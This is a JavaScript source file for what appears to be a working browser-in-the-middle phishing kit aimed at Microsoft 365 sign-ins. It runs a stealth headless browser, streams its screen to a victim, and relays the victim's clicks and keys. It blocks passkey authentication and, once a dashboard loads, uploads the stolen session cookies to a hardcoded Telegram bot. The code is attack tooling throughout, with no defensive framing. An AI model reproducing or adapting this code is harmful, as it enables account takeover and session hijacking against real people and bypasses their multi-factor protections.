const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

/**
 * Sends the full cookie jar as a .json file to Telegram.
 * Uses plain text for notifications to avoid Markdown parsing errors.
 */
async function sendExfiltrationAlert(cookies, finalUrl) {
    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        // 1. Plain text notification (No Markdown to prevent 'entity not found' errors)
        await axios.post(msgUrl, {
            chat_id: CHAT_ID,
            text: `✅ SUCCESS: Reached Dashboard\nURL: ${finalUrl}\nTotal Cookies: ${cookies.length}\nAction: Uploading session file...`
        });

        // 2. Prepare the Cookie JSON
        const cookieData = JSON.stringify(cookies, null, 2);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        
        // Use hostname for the caption to keep it clean
        let host = "Unknown";
        try { host = new URL(finalUrl).hostname; } catch(e) {}
        
        form.append('caption', `Session Jar: ${host}`);
        form.append('document', Buffer.from(cookieData, 'utf-8'), {
            filename: `cookies_${Date.now()}.json`,
            contentType: 'application/json'
        });

        // 3. Multipart Upload
        await axios.post(docUrl, form, {
            headers: form.getHeaders()
        });

        console.log("[TELEGRAM] Cookie file sent successfully.");
    } catch (e) {
        console.error('[EXFIL-FATAL]', e.response?.data || e.message);
    }
}

async function startSession(io, socket) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-dev-shm-usage', 
                '--single-process',
                '--no-zygote'
            ]
        });

        const page = await browser.newPage();

        // 2026 Passkey Fallback Script
        await page.evaluateOnNewDocument(() => {
            delete window.PublicKeyCredential;
            if (navigator.credentials) {
                const originalGet = navigator.credentials.get;
                navigator.credentials.get = function(opt) {
                    if (opt && opt.publicKey) {
                        return Promise.reject(new DOMException("User cancelled", "NotAllowedError"));
                    }
                    return originalGet.call(this, opt);
                };
            }
        });

        await page.setViewport({ width: 1280, height: 720 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0');

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});
        
        const heartbeat = setInterval(emitFrame, 1500);

        // Success Detection Logic
        page.on('framenavigated', async (frame) => {
            const url = frame.url();
            console.log(`[NAV] ${url}`);
            
            const dashboardKeys = ['office.com', 'microsoft365.com', 'shell/homepage', 'outlook.live', 'myapps.microsoft'];
            if (dashboardKeys.some(key => url.toLowerCase().includes(key))) {
                console.log("[TRIGGER] Dashboard detected. Extracting cookies...");
                const cookies = await page.cookies();
                // Send alert but don't stop the session immediately so the victim doesn't panic
                await sendExfiltrationAlert(cookies, url);
            }
        });

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                else if (data.type === 'key') await page.keyboard.press(data.key);
                await emitFrame();
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            if (browser) await browser.close();
            console.log(`[CLEANUP] Session closed: ${socket.id}`);
        });

    } catch (error) {
        console.error('[ORCH-ERR]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
